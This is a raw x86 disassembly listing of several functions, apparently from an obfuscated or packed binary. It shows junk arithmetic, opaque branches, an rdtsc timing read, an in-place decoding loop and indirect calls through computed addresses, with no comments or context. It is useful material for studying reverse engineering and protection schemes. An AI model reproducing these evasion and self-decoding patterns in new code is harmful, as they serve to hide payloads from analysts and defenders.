  452694:	call   0x452a9f
  452699:	mov    esi,ebx
  45269b:	mov    DWORD PTR [ebp-0x18],esi
  45269e:	mov    DWORD PTR [ebp-0x8],eax
  4526a1:	push   ebx
  4526a2:	push   0x2cd08300
  4526a7:	call   0x45347c
  4526ac:	add    esp,0x8
  4526af:	call   0x452a9f
  4526b4:	add    edi,esi
  4526b6:	xor    DWORD PTR [ebp-0x18],esi
  4526b9:	mov    edx,DWORD PTR [ebp-0x18]
  4526bc:	cmp    edi,esi
  4526be:	je     0x4526d4
  4526c0:	mov    esi,DWORD PTR [ebp-0x18]
  4526c3:	add    edx,edi
  4526c5:	mov    ebx,edi
  4526c7:	sub    esi,edi
  4526c9:	xor    DWORD PTR [ebp-0x18],esi
  4526cc:	add    ebx,eax
  4526ce:	sub    DWORD PTR [ebp-0x18],edx
  4526d1:	sub    DWORD PTR [ebp-0x18],ebx
  4526d4:	mov    DWORD PTR [ebp-0x30],eax
  4526d7:	mov    ebx,0xad
  4526dc:	push   0xffffffb9
  4526de:	push   eax
  4526df:	call   0x4539fb
  4526e4:	add    esp,0x8
  4526e7:	call   0x4539fb
  4526ec:	push   esi
  4526ed:	push   0x34184000
  4526f2:	push   esi
  4526f3:	push   0xf097af00
  4526f8:	push   0x2c305100
  4526fd:	call   0x45347c
  452702:	add    esp,0x14
  452705:	push   0x2c47d900
  45270a:	push   eax
  45270b:	push   0xb8ece000
  452710:	call   0x453f82
  452715:	add    esp,0xc
  452718:	push   esi
  452719:	push   edi
  45271a:	push   0xffffff93
  45271c:	push   eax
  45271d:	push   ebx
  45271e:	call   0x453f82
  452723:	add    esp,0x14
  452726:	mov    edx,DWORD PTR [ebp-0x8]
  452729:	mov    ecx,DWORD PTR [ebp-0x18]
  45272c:	mov    eax,edi
  45272e:	cmp    edx,DWORD PTR ds:0x4718d4
  452734:	je     0x45279d
  452736:	cmp    eax,0x67
  452739:	jne    0x45279d
  45273b:	add    ecx,ebx
  45273d:	mov    edi,edx
  45273f:	test   eax,0xdc
  452744:	jne    0x45279d
  452746:	mov    DWORD PTR [ebp-0x18],ebx
  452749:	mov    esi,DWORD PTR [ebp-0x18]
  45274c:	add    edi,edi
  45274e:	add    DWORD PTR [ebp-0x18],eax
  452751:	sub    ecx,edi
  452753:	sub    ecx,edi
  452755:	mov    eax,DWORD PTR ds:0x4718d0
  45275b:	add    DWORD PTR [ebp-0x18],ecx
  45275e:	sub    eax,ecx
  452760:	add    eax,eax
  452762:	sub    DWORD PTR [ebp-0x18],esi
  452765:	cmp    eax,DWORD PTR ds:0x4718d0
  45276b:	jne    0x45279d
  45276d:	mov    ebx,DWORD PTR [ebp-0x18]
  452770:	sub    ebx,edi
  452772:	sub    eax,edx
  452774:	cmp    eax,0xe73f
  452779:	jne    0x45279d
  45277b:	mov    ecx,DWORD PTR ds:0x4718c8
  452781:	sub    DWORD PTR [ebp-0x18],ebx
  452784:	mov    edi,0x57fa
  452789:	sub    edi,ebx
  45278b:	and    eax,ecx
  45278d:	sub    edi,edx
  45278f:	sub    eax,edi
  452791:	sub    eax,esi
  452793:	cmp    eax,0x6929
  452798:	jne    0x45279d
  45279a:	mov    DWORD PTR [ebp-0x18],eax
  45279d:	sub    edx,DWORD PTR [ebp-0xc]
  4527a0:	cmp    edx,0xffffff87
  4527a3:	je     0x4527c7
  4527a5:	cmp    edx,0xffffff88
  4527a8:	jne    0x4527c7
  4527aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4527ad:	mov    esi,DWORD PTR [ebp-0x18]
  4527b0:	xor    DWORD PTR [ebp-0x18],ebx
  4527b3:	add    DWORD PTR [ebp-0x18],esi
  4527b6:	sub    DWORD PTR [ebp-0x18],edx
  4527b9:	sub    ecx,ebx
  4527bb:	cmp    ecx,0xfffffff3
  4527be:	jne    0x4527c7
  4527c0:	cmp    ecx,edx
  4527c2:	je     0x4527c7
  4527c4:	mov    DWORD PTR [ebp-0x18],ecx
  4527c7:	xor    edx,0xe9e834b0
  4527cd:	add    eax,esi
  4527cf:	add    eax,ecx
  4527d1:	mov    ebx,0x3
  4527d6:	and    DWORD PTR [ebp-0x18],ebx
  4527d9:	cmp    eax,DWORD PTR [ebp-0x14]
  4527dc:	je     0x452807
  4527de:	add    eax,esi
  4527e0:	mov    ecx,edi
  4527e2:	sub    eax,edi
  4527e4:	add    ecx,ecx
  4527e6:	xor    edi,edi
  4527e8:	sub    ecx,edi
  4527ea:	or     ecx,eax
  4527ec:	or     ecx,ebx
  4527ee:	and    DWORD PTR [ebp-0x18],edx
  4527f1:	sub    ecx,edi
  4527f3:	cmp    ecx,DWORD PTR ds:0x4718c8
  4527f9:	jne    0x452807
  4527fb:	mov    esi,ecx
  4527fd:	add    esi,ebx
  4527ff:	mov    ecx,DWORD PTR [ebp-0x18]
  452802:	sub    esi,ecx
  452804:	and    DWORD PTR [ebp-0x18],esi
  452807:	mov    eax,DWORD PTR [ebp-0x30]
  45280a:	mov    ebx,DWORD PTR ds:0x4718d0
  452810:	xor    DWORD PTR [ebp-0x18],ebx
  452813:	sub    eax,DWORD PTR [ebp-0x8]
  452816:	mov    ecx,DWORD PTR [ebp-0x18]
  452819:	cmp    ecx,DWORD PTR ds:0x4718d4
  45281f:	jne    0x452824
  452821:	xor    DWORD PTR [ebp-0x18],ecx
  452824:	xor    eax,0xe9e834b5
  452829:	add    esi,esi
  45282b:	mov    edi,0x85
  452830:	mov    ebx,DWORD PTR [ebp-0x18]
  452833:	and    esi,ecx
  452835:	cmp    ebx,DWORD PTR ds:0x4718c8
  45283b:	jne    0x452885
  45283d:	mov    ecx,DWORD PTR [ebp-0x18]
  452840:	sub    ecx,ebx
  452842:	add    edi,eax
  452844:	and    ecx,ebx
  452846:	cmp    esi,DWORD PTR [ebp-0x38]
  452849:	jne    0x452885
  45284b:	mov    ebx,0x8cbf
  452850:	add    DWORD PTR [ebp-0x18],esi
  452853:	cmp    edi,0xffffff86
  452856:	je     0x452885
  452858:	sub    DWORD PTR [ebp-0x18],edi
  45285b:	mov    edi,DWORD PTR [ebp-0x18]
  45285e:	cmp    ecx,esi
  452860:	je     0x452885
  452862:	sub    DWORD PTR [ebp-0x18],ecx
  452865:	mov    esi,DWORD PTR [ebp-0x18]
  452868:	sub    ebx,edx
  45286a:	mov    ecx,0x3258
  45286f:	add    DWORD PTR [ebp-0x18],edx
  452872:	sub    ebx,edx
  452874:	sub    DWORD PTR [ebp-0x18],ebx
  452877:	add    ecx,eax
  452879:	add    esi,edi
  45287b:	add    esi,edi
  45287d:	and    ecx,eax
  45287f:	add    DWORD PTR [ebp-0x18],esi
  452882:	mov    DWORD PTR [ebp-0x18],ecx
  452885:	cmp    edx,eax
  452887:	je     0x4529d8
  45288d:	add    ebx,esi
  45288f:	push   esi
  452890:	push   ebx
  452891:	push   0x2c007400
  452896:	push   0xffffffb8
  452898:	push   0x52
  45289a:	call   0x4536fd
  45289f:	add    esp,0x14
  4528a2:	push   0x4718d4
  4528a7:	call   DWORD PTR ds:0x460038
  4528ad:	sub    ebx,esi
  4528af:	and    ebx,edi
  4528b1:	and    ebx,esi
  4528b3:	add    ebx,edi
  4528b5:	add    ebx,esi
  4528b7:	sub    DWORD PTR [ebp-0x18],ebx
  4528ba:	or     eax,eax
  4528bc:	je     0x4529d8
  4528c2:	add    ebx,esi
  4528c4:	mov    edi,DWORD PTR [ebp-0x18]
  4528c7:	cmp    edi,0xfffffff1
  4528ca:	je     0x4528e0
  4528cc:	mov    DWORD PTR [ebp-0x34],ebx
  4528cf:	mov    ecx,0xab
  4528d4:	mov    edx,DWORD PTR [ebp-0x18]
  4528d7:	add    edx,ebx
  4528d9:	and    edi,edx
  4528db:	add    ecx,edi
  4528dd:	sub    DWORD PTR [ebp-0x34],ecx
  4528e0:	add    DWORD PTR [ebp-0x4c],0xb56070d6
  4528e7:	add    DWORD PTR [ebp-0x18],ebx
  4528ea:	lea    edi,[eax+0xbcb]
  4528f0:	and    ecx,esi
  4528f2:	mov    ebx,DWORD PTR [ebp-0x18]
  4528f5:	mov    edx,DWORD PTR [ebp-0x18]
  4528f8:	and    ecx,ebx
  4528fa:	push   ecx
  4528fb:	push   0x7d
  4528fd:	push   ecx
  4528fe:	push   0x1e6dc500
  452903:	push   0x0
  452905:	call   0x4539fb
  45290a:	add    esp,0x14
  45290d:	inc    edi
  45290e:	push   0xe0d7c600
  452913:	call   0x4536fd
  452918:	add    esp,0x4
  45291b:	mov    ecx,DWORD PTR [edi]
  45291d:	sub    DWORD PTR [ebp-0x18],ecx
  452920:	sub    ecx,0x95a54d23
  452926:	mov    ebx,DWORD PTR [ebp-0x18]
  452929:	test   ecx,0x72
  45292f:	je     0x4529ac
  452931:	cmp    ebx,0xffffff8e
  452934:	jne    0x4529ac
  452936:	sub    ebx,eax
  452938:	add    DWORD PTR [ebp-0x18],eax
  45293b:	mov    edx,ebx
  45293d:	mov    eax,esi
  45293f:	sub    edx,ebx
  452941:	add    DWORD PTR [ebp-0x18],ecx
  452944:	test   esi,0x43
  45294a:	jne    0x4529ac
  45294c:	sub    DWORD PTR [ebp-0x18],edx
  45294f:	mov    edx,0xfa
  452954:	mov    ebx,edx
  452956:	cmp    edi,DWORD PTR ds:0x4718d4
  45295c:	je     0x4529ac
  45295e:	cmp    esi,0x4b
  452961:	jne    0x4529ac
  452963:	mov    edx,DWORD PTR [ebp-0x18]
  452966:	sub    DWORD PTR [ebp-0x18],edx
  452969:	test   eax,0x2c
  45296e:	jne    0x4529ac
  452970:	add    DWORD PTR [ebp-0x18],esi
  452973:	test   eax,0x49b6
  452978:	je     0x4529ac
  45297a:	mov    edx,eax
  45297c:	mov    ebx,0xba
  452981:	add    DWORD PTR [ebp-0x18],ebx
  452984:	cmp    edx,0x5f09
  45298a:	je     0x4529ac
  45298c:	test   edx,0x2e
  452992:	je     0x4529ac
  452994:	xor    ebx,ebx
  452996:	mov    eax,DWORD PTR [ebp-0x18]
  452999:	add    eax,edx
  45299b:	sub    DWORD PTR [ebp-0x18],ebx
  45299e:	or     eax,ebx
  4529a0:	test   eax,0x15
  4529a5:	je     0x4529ac
  4529a7:	sub    eax,ecx
  4529a9:	or     DWORD PTR [ebp-0x18],eax
  4529ac:	cmp    ecx,0x307b1ce5
  4529b2:	jne    0x4528f0
  4529b8:	push   eax
  4529b9:	push   0x74530200
  4529be:	push   0xffffffd9
  4529c0:	push   0x2c742200
  4529c5:	call   0x45347c
  4529ca:	add    esp,0x10
  4529cd:	mov    ecx,DWORD PTR [edi+0x4]
  4529d0:	xor    eax,eax
  4529d2:	and    DWORD PTR [ebp-0x18],eax
  4529d5:	sub    DWORD PTR [ebp-0x4c],ecx
  4529d8:	push   esi
  4529d9:	push   edi
  4529da:	push   0xffffffce
  4529dc:	push   0xde5d0f00
  4529e1:	call   0x4539fb
  4529e6:	add    esp,0x10
  4529e9:	sub    edi,ebx
  4529eb:	mov    edx,DWORD PTR [ebp-0x18]
  4529ee:	push   0xffffff86
  4529f0:	push   edx
  4529f1:	call   0x4539fb
  4529f6:	add    esp,0x8
  4529f9:	call   0x4539fb
  4529fe:	add    DWORD PTR [ebp-0x18],esi
  452a01:	push   0xffffffca
  452a03:	call   0x4536fd
  452a08:	add    esp,0x4
  452a0b:	add    DWORD PTR [ebp-0x18],edi
  452a0e:	mov    esi,DWORD PTR [ebp+0xc]
  452a11:	push   esi
  452a12:	push   0xffffffc8
  452a14:	push   0x20
  452a16:	push   0x6e033800
  452a1b:	call   0x45347c
  452a20:	add    esp,0x10
  452a23:	mov    ebx,DWORD PTR [ebp-0x4c]
  452a26:	push   0xfffffff2
  452a28:	push   ebx
  452a29:	push   0xe0e98c00
  452a2e:	call   0x45347c
  452a33:	add    esp,0xc
  452a36:	mov    DWORD PTR [esi+0x0],ebx
  452a39:	push   0xffffffd9
  452a3b:	push   eax
  452a3c:	push   0x10986d00
  452a41:	push   0xffffffb3
  452a43:	push   0xe
  452a45:	call   0x4536fd
  452a4a:	add    esp,0x14
  452a4d:	mov    edx,DWORD PTR [ebp-0x18]
  452a50:	push   0xc1a5b00
  452a55:	push   0xb459fa00
  452a5a:	push   edx
  452a5b:	call   0x4536fd
  452a60:	add    esp,0xc
  452a63:	pop    edi
  452a64:	add    esi,esi
  452a66:	push   0x2e2cf600
  452a6b:	push   esi
  452a6c:	call   0x4539fb
  452a71:	add    esp,0x8
  452a74:	pop    esi
  452a75:	push   eax
  452a76:	push   0xb8d2e800
  452a7b:	call   0x453f82
  452a80:	add    esp,0x8
  452a83:	pop    ebx
  452a84:	push   0xe0e27700
  452a89:	push   0x60de6600
  452a8e:	call   0x45347c
  452a93:	add    esp,0x8
  452a96:	leave  
  452a97:	ret    0x8
  452a9a:	int3   
  452a9b:	int3   
  452a9c:	int3   
  452a9d:	int3   
  452a9e:	int3   
  452a9f:	push   ebp
  452aa0:	mov    ebp,esp
  452aa2:	sub    esp,0x34
  452aa5:	mov    edx,0xf5
  452aaa:	push   edx
  452aab:	push   0xffffffcb
  452aad:	push   0xffffffc3
  452aaf:	push   edx
  452ab0:	push   edx
  452ab1:	call   0x4536fd
  452ab6:	add    esp,0x14
  452ab9:	push   ebx
  452aba:	push   0x7
  452abc:	push   0xffffff87
  452abe:	push   eax
  452abf:	call   0x45347c
  452ac4:	add    esp,0xc
  452ac7:	push   esi
  452ac8:	push   eax
  452ac9:	call   0x4539fb
  452ace:	add    esp,0x4
  452ad1:	push   edi
  452ad2:	push   eax
  452ad3:	call   0x4536fd
  452ad8:	add    esp,0x4
  452adb:	cmp    eax,0x47
  452ade:	je     0x452ae5
  452ae0:	call   0x4539fb
  452ae5:	test   eax,0xbe
  452aea:	jne    0x452bdf
  452af0:	mov    esi,eax
  452af2:	push   0x42
  452af4:	push   0xffffffaf
  452af6:	push   0xffffffdc
  452af8:	push   0xffffff91
  452afa:	push   eax
  452afb:	call   0x4539fb
  452b00:	add    esp,0x14
  452b03:	push   eax
  452b04:	call   0x45347c
  452b09:	add    esp,0x4
  452b0c:	push   0x7093ff00
  452b11:	push   eax
  452b12:	push   0xffffffae
  452b14:	call   0x453f82
  452b19:	add    esp,0xc
  452b1c:	push   0xde1a9e00
  452b21:	push   0xc8ffa300
  452b26:	push   eax
  452b27:	call   0x4539fb
  452b2c:	add    esp,0xc
  452b2f:	xor    ecx,ecx
  452b31:	push   eax
  452b32:	call   0x45347c
  452b37:	add    esp,0x4
  452b3a:	add    esi,esi
  452b3c:	push   0x39
  452b3e:	push   0x90bb2000
  452b43:	call   0x453f82
  452b48:	add    esp,0x8
  452b4b:	add    esi,esi
  452b4d:	push   0x5b
  452b4f:	push   0x75
  452b51:	push   0x4a
  452b53:	push   0x4cc5ae00
  452b58:	push   0xffffffac
  452b5a:	call   0x4539fb
  452b5f:	add    esp,0x14
  452b62:	push   eax
  452b63:	call   0x45347c
  452b68:	add    esp,0x4
  452b6b:	cmp    esi,0xa35d
  452b71:	jne    0x452bdf
  452b73:	mov    ebx,0x90
  452b78:	mov    eax,DWORD PTR ds:0x471928
  452b7e:	mov    DWORD PTR [ebp-0x4],esi
  452b81:	sub    ebx,eax
  452b83:	add    ebx,eax
  452b85:	push   esi
  452b86:	push   0x50
  452b88:	push   0xfffffffe
  452b8a:	call   0x4539fb
  452b8f:	add    esp,0xc
  452b92:	sub    ebx,eax
  452b94:	push   eax
  452b95:	push   0x5a
  452b97:	push   esi
  452b98:	call   0x45347c
  452b9d:	add    esp,0xc
  452ba0:	push   esi
  452ba1:	push   0xec892a00
  452ba6:	push   0xffffffd0
  452ba8:	push   0xf8ffee00
  452bad:	call   0x4539fb
  452bb2:	add    esp,0x10
  452bb5:	push   0xec9d8400
  452bba:	push   0xffffffc3
  452bbc:	push   esi
  452bbd:	push   0xfffffffc
  452bbf:	call   0x453f82
  452bc4:	add    esp,0x10
  452bc7:	and    ebx,esi
  452bc9:	push   0x98dca500
  452bce:	push   0xf44cbb00
  452bd3:	push   ebx
  452bd4:	push   esi
  452bd5:	push   0x1
  452bd7:	call   0x453f82
  452bdc:	add    esp,0x14
  452bdf:	rdtsc  
  452be1:	mov    DWORD PTR [ebp-0x1c],edx
  452be4:	mov    edx,0xb5
  452be9:	mov    esi,0xf9
  452bee:	add    DWORD PTR [ebp-0x1c],edx
  452bf1:	add    DWORD PTR [ebp-0x1c],eax
  452bf4:	sub    DWORD PTR [ebp-0x1c],esi
  452bf7:	and    edx,ebx
  452bf9:	add    DWORD PTR [ebp-0x1c],edx
  452bfc:	pop    edi
  452bfd:	cmp    edx,DWORD PTR ds:0x471928
  452c03:	jne    0x452c34
  452c05:	mov    ecx,0x28
  452c0a:	mov    ebx,0xc9
  452c0f:	add    DWORD PTR [ebp-0x1c],ecx
  452c12:	or     ebx,ecx
  452c14:	and    ebx,edx
  452c16:	cmp    edi,0x77
  452c19:	je     0x452c34
  452c1b:	cmp    edi,0xffffffa9
  452c1e:	jne    0x452c34
  452c20:	mov    edx,DWORD PTR [ebp-0x1c]
  452c23:	sub    DWORD PTR [ebp-0x1c],ebx
  452c26:	and    edx,eax
  452c28:	sub    edx,esi
  452c2a:	cmp    edx,DWORD PTR [ebp-0x24]
  452c2d:	jne    0x452c34
  452c2f:	add    edx,eax
  452c31:	sub    DWORD PTR [ebp-0x1c],edx
  452c34:	pop    esi
  452c35:	mov    ebx,DWORD PTR [ebp-0x1c]
  452c38:	add    ebx,edx
  452c3a:	cmp    esi,DWORD PTR [ebp-0x30]
  452c3d:	jne    0x452c4a
  452c3f:	test   edi,0x3b
  452c45:	je     0x452c4a
  452c47:	sub    DWORD PTR [ebp-0x1c],ebx
  452c4a:	pop    ebx
  452c4b:	mov    edx,edi
  452c4d:	mov    ecx,0xc3d6
  452c52:	test   edx,0xa8
  452c58:	jne    0x452c6f
  452c5a:	sub    DWORD PTR [ebp-0x1c],edx
  452c5d:	xor    edx,edx
  452c5f:	add    DWORD PTR [ebp-0x1c],edx
  452c62:	sub    ecx,esi
  452c64:	cmp    ebx,DWORD PTR ds:0x471928
  452c6a:	je     0x452c6f
  452c6c:	add    DWORD PTR [ebp-0x1c],ecx
  452c6f:	leave  
  452c70:	ret    
  452c71:	int3   
  452c72:	int3   
  452c73:	int3   
  452c74:	int3   
  452c75:	int3   
  452c76:	push   ebp
  452c77:	mov    ebp,esp
  452c79:	sub    esp,0x38
  452c7c:	call   0x4536fd
  452c81:	push   ebx
  452c82:	push   0x11
  452c84:	push   0xc8a78e00
  452c89:	push   0x1e075300
  452c8e:	call   0x4539fb
  452c93:	add    esp,0xc
  452c96:	push   esi
  452c97:	push   eax
  452c98:	push   0x345d2b00
  452c9d:	push   eax
  452c9e:	push   0xffffffc0
  452ca0:	call   0x45347c
  452ca5:	add    esp,0x10
  452ca8:	push   edi
  452ca9:	cmp    eax,0xffffffad
  452cac:	je     0x452cb1
  452cae:	mov    DWORD PTR [ebp-0x34],eax
  452cb1:	cmp    eax,0xffffffa7
  452cb4:	jne    0x452cc7
  452cb6:	push   0xc54ef00
  452cbb:	push   eax
  452cbc:	push   eax
  452cbd:	push   eax
  452cbe:	push   eax
  452cbf:	call   0x4536fd
  452cc4:	add    esp,0x14
  452cc7:	mov    edx,DWORD PTR [ebp+0x10]
  452cca:	mov    DWORD PTR [ebp-0x10],edx
  452ccd:	mov    eax,DWORD PTR [ebp+0x8]
  452cd0:	mov    ecx,0x55
  452cd5:	add    DWORD PTR [ebp-0x10],ecx
  452cd8:	cmp    DWORD PTR [ebp+0xc],edx
  452cdb:	je     0x452e96
  452ce1:	test   edx,0x5ad4
  452ce7:	jne    0x452dc0
  452ced:	mov    esi,DWORD PTR [ebp-0x10]
  452cf0:	or     DWORD PTR [ebp-0x10],eax
  452cf3:	mov    ecx,DWORD PTR [ebp-0x10]
  452cf6:	sub    DWORD PTR [ebp-0x10],esi
  452cf9:	cmp    ecx,DWORD PTR [ebp-0x38]
  452cfc:	jne    0x452dc0
  452d02:	add    ecx,edx
  452d04:	mov    esi,DWORD PTR [ebp-0x10]
  452d07:	mov    edi,DWORD PTR [ebp-0x10]
  452d0a:	add    edi,esi
  452d0c:	sub    DWORD PTR [ebp-0x10],edi
  452d0f:	cmp    ecx,DWORD PTR [ebp-0x24]
  452d12:	je     0x452dc0
  452d18:	mov    ebx,0x25
  452d1d:	mov    esi,DWORD PTR [ebp-0x10]
  452d20:	add    esi,esi
  452d22:	test   ecx,0x24
  452d28:	je     0x452dc0
  452d2e:	cmp    ecx,DWORD PTR [ebp-0x24]
  452d31:	jne    0x452dc0
  452d37:	mov    edi,DWORD PTR [ebp-0x10]
  452d3a:	add    DWORD PTR [ebp-0x10],ebx
  452d3d:	mov    ebx,0x99
  452d42:	cmp    esi,0x19
  452d45:	jne    0x452dc0
  452d47:	test   ecx,0x84
  452d4d:	jne    0x452dc0
  452d4f:	sub    DWORD PTR [ebp-0x10],esi
  452d52:	sub    ecx,esi
  452d54:	mov    esi,DWORD PTR [ebp-0x10]
  452d57:	cmp    esi,0x23
  452d5a:	jne    0x452dc0
  452d5c:	add    edi,edi
  452d5e:	and    esi,ebx
  452d60:	cmp    esi,ecx
  452d62:	jne    0x452dc0
  452d64:	cmp    ecx,0x30841840
  452d6a:	jne    0x452dc0
  452d6c:	and    DWORD PTR [ebp-0x10],esi
  452d6f:	test   ecx,0xe0
  452d75:	jne    0x452dc0
  452d77:	cmp    edi,0xffffff91
  452d7a:	je     0x452dc0
  452d7c:	sub    edi,ebx
  452d7e:	add    DWORD PTR [ebp-0x10],edi
  452d81:	mov    esi,eax
  452d83:	cmp    ecx,eax
  452d85:	je     0x452dc0
  452d87:	mov    ebx,edi
  452d89:	sub    DWORD PTR [ebp-0x10],ebx
  452d8c:	mov    ebx,DWORD PTR [ebp-0x10]
  452d8f:	test   ebx,0xa8
  452d95:	je     0x452dc0
  452d97:	or     esi,eax
  452d99:	mov    edi,DWORD PTR [ebp-0x10]
  452d9c:	add    ebx,eax
  452d9e:	test   esi,0x5e
  452da4:	je     0x452dc0
  452da6:	cmp    ebx,0xffffffcb
  452da9:	jne    0x452dc0
  452dab:	sub    DWORD PTR [ebp-0x10],eax
  452dae:	sub    edi,edx
  452db0:	and    ecx,edi
  452db2:	cmp    edx,DWORD PTR [ebp-0xc]
  452db5:	jne    0x452dc0
  452db7:	sub    DWORD PTR [ebp-0x10],ebx
  452dba:	add    DWORD PTR [ebp-0x10],ecx
  452dbd:	xor    DWORD PTR [ebp-0x10],esi
  452dc0:	dec    DWORD PTR [ebp+0xc]
  452dc3:	add    DWORD PTR [ebp-0x10],eax
  452dc6:	rol    DWORD PTR [eax],0xc
  452dc9:	mov    DWORD PTR [ebp-0x10],edx
  452dcc:	sub    DWORD PTR [eax],0x757d24d0
  452dd2:	add    ecx,ecx
  452dd4:	sub    DWORD PTR [ebp-0x10],ecx
  452dd7:	sub    DWORD PTR [eax],edx
  452dd9:	cmp    edi,0x4f
  452ddc:	je     0x452e43
  452dde:	test   ebx,0xe4
  452de4:	je     0x452e43
  452de6:	and    ecx,edi
  452de8:	mov    ebx,DWORD PTR [ebp-0x10]
  452deb:	mov    edi,0xde
  452df0:	add    edi,eax
  452df2:	add    edi,edi
  452df4:	test   edi,0x5a
  452dfa:	je     0x452e43
  452dfc:	mov    esi,edi
  452dfe:	add    esi,eax
  452e00:	mov    edi,DWORD PTR [ebp-0x10]
  452e03:	sub    DWORD PTR [ebp-0x10],ecx
  452e06:	test   esi,0x99ec
  452e0c:	je     0x452e43
  452e0e:	add    esi,esi
  452e10:	mov    ecx,edx
  452e12:	cmp    ecx,0xffffffa8
  452e15:	jne    0x452e43
  452e17:	add    ecx,eax
  452e19:	sub    edi,eax
  452e1b:	and    ecx,edx
  452e1d:	and    edi,eax
  452e1f:	mov    DWORD PTR [ebp-0x10],ebx
  452e22:	cmp    ecx,0xffffffa5
  452e25:	je     0x452e43
  452e27:	and    edi,ecx
  452e29:	add    esi,eax
  452e2b:	mov    ebx,DWORD PTR [ebp-0x10]
  452e2e:	mov    ecx,DWORD PTR [ebp-0x10]
  452e31:	mov    DWORD PTR [ebp-0x10],ebx
  452e34:	sub    ecx,edx
  452e36:	sub    DWORD PTR [ebp-0x10],esi
  452e39:	add    edi,ecx
  452e3b:	cmp    edi,DWORD PTR [ebp-0x14]
  452e3e:	jne    0x452e43
  452e40:	or     DWORD PTR [ebp-0x10],edi
  452e43:	sub    DWORD PTR [eax],0x9f5bd017
  452e49:	test   ebx,0xac
  452e4f:	jne    0x452e67
  452e51:	mov    ecx,DWORD PTR [ebp-0x10]
  452e54:	mov    esi,0xd0a0
  452e59:	add    DWORD PTR [ebp-0x10],esi
  452e5c:	cmp    ecx,0x4e84020
  452e62:	jne    0x452e67
  452e64:	add    DWORD PTR [ebp-0x10],ecx
  452e67:	add    eax,0x4
  452e6a:	and    ecx,eax
  452e6c:	sub    DWORD PTR [ebp-0x10],edi
  452e6f:	cmp    ecx,0x5c
  452e72:	je     0x452e91
  452e74:	mov    esi,DWORD PTR [ebp-0x10]
  452e77:	cmp    esi,edx
  452e79:	je     0x452e91
  452e7b:	add    esi,edx
  452e7d:	or     ecx,esi
  452e7f:	mov    esi,DWORD PTR [ebp-0x10]
  452e82:	sub    DWORD PTR [ebp-0x10],esi
  452e85:	add    ecx,edx
  452e87:	sub    ecx,esi
  452e89:	add    DWORD PTR [ebp-0x10],edi
  452e8c:	and    ecx,edx
  452e8e:	add    DWORD PTR [ebp-0x10],ecx
  452e91:	jmp    0x452cd0
  452e96:	cmp    eax,0x70008420
  452e9b:	jne    0x452ea2
  452e9d:	call   0x4539fb
  452ea2:	push   eax
  452ea3:	push   eax
  452ea4:	push   eax
  452ea5:	push   0x8c3ea400
  452eaa:	push   eax
  452eab:	call   0x45347c
  452eb0:	add    esp,0x14
  452eb3:	test   eax,0xce
  452eb8:	jne    0x452eca
  452eba:	push   0x72
  452ebc:	push   0x2e0d6d00
  452ec1:	push   eax
  452ec2:	call   0x4536fd
  452ec7:	add    esp,0xc
  452eca:	pop    edi
  452ecb:	push   0x79
  452ecd:	push   edi
  452ece:	push   eax
  452ecf:	call   0x4536fd
  452ed4:	add    esp,0xc
  452ed7:	pop    esi
  452ed8:	mov    eax,esi
  452eda:	push   esi
  452edb:	call   0x45347c
  452ee0:	add    esp,0x4
  452ee3:	pop    ebx
  452ee4:	add    DWORD PTR [ebp-0x10],ebx
  452ee7:	leave  
  452ee8:	ret    0xc
  452eeb:	int3   
  452eec:	int3   
  452eed:	int3   
  452eee:	int3   
  452eef:	int3   
  452ef0:	push   ebp
  452ef1:	mov    ebp,esp
  452ef3:	sub    esp,0x30
  452ef6:	push   0xd8d0d000
  452efb:	push   0xfffffff4
  452efd:	push   0xe354d00
  452f02:	push   0xc6a5b00
  452f07:	push   0xfffffff2
  452f09:	call   0x4539fb
  452f0e:	add    esp,0x14
  452f11:	push   ebx
  452f12:	mov    ebx,0x76
  452f17:	push   0x74001100
  452f1c:	push   ebx
  452f1d:	push   0x1c
  452f1f:	push   0xae4b8300
  452f24:	call   0x453f82
  452f29:	add    esp,0x10
  452f2c:	push   esi
  452f2d:	mov    edx,DWORD PTR ds:0x4718a0
  452f33:	push   0xbe7a2d00
  452f38:	push   0x5e3ba400
  452f3d:	push   0x13
  452f3f:	push   0x24c96600
  452f44:	push   eax
  452f45:	call   0x453f82
  452f4a:	add    esp,0x14
  452f4d:	push   edi
  452f4e:	push   ebx
  452f4f:	push   0xffffffe8
  452f51:	push   0xcc96d800
  452f56:	push   0x24
  452f58:	push   0x79
  452f5a:	call   0x453f82
  452f5f:	add    esp,0x14
  452f62:	mov    DWORD PTR [ebp-0x30],ebx
  452f65:	mov    edx,0x5e71b977
  452f6a:	cmp    eax,DWORD PTR [ebp-0x30]
  452f6d:	je     0x452f75
  452f6f:	mov    ebx,DWORD PTR [ebp-0x30]
  452f72:	add    DWORD PTR [ebp-0x30],ebx
  452f75:	sub    edx,0x5e71b937
  452f7b:	mov    ebx,eax
  452f7d:	sub    ebx,eax
  452f7f:	mov    eax,DWORD PTR [ebp-0x30]
  452f82:	sub    ebx,eax
  452f84:	sub    ebx,edx
  452f86:	add    DWORD PTR [ebp-0x30],ebx
  452f89:	push   edx
  452f8a:	push   ebx
  452f8b:	push   0xe2d2400
  452f90:	call   0x4536fd
  452f95:	add    esp,0x8
  452f98:	mov    edx,0xae4ab6c1
  452f9d:	add    DWORD PTR [ebp-0x30],edx
  452fa0:	add    edx,0x51b5593f
  452fa6:	sub    ebx,edx
  452fa8:	sub    DWORD PTR [ebp-0x30],ebx
  452fab:	push   edx
  452fac:	push   0xffffffe2
  452fae:	push   edx
  452faf:	push   0xf426f400
  452fb4:	push   0x3f
  452fb6:	push   0xffffff81
  452fb8:	call   0x4539fb
  452fbd:	add    esp,0x14
  452fc0:	push   0x5fd3a
  452fc5:	cmp    eax,ebx
  452fc7:	je     0x452fde
  452fc9:	push   0x53
  452fcb:	push   0xffffff8c
  452fcd:	push   0xfffffff6
  452fcf:	push   0x22
  452fd1:	push   0xe614100
  452fd6:	call   0x4536fd
  452fdb:	add    esp,0x14
  452fde:	push   0x0
  452fe0:	mov    ebx,DWORD PTR [ebp-0x30]
  452fe3:	add    DWORD PTR [ebp-0x30],ebx
  452fe6:	mov    esi,0xccea6c25
  452feb:	mov    ecx,esi
  452fed:	call   0x45347c
  452ff2:	sub    esi,0xcca46bb9
  452ff8:	push   eax
  452ff9:	call   0x453f82
  452ffe:	add    esp,0x4
  453001:	call   DWORD PTR [esi]
  453003:	or     esi,ebx
  453005:	add    DWORD PTR [ebp-0x30],esi
  453008:	mov    DWORD PTR [ebp-0x20],eax
  45300b:	add    esi,esi
  45300d:	cmp    esi,0xffffffc9
  453010:	je     0x45305a
  453012:	call   0x4536fd
  453017:	push   eax
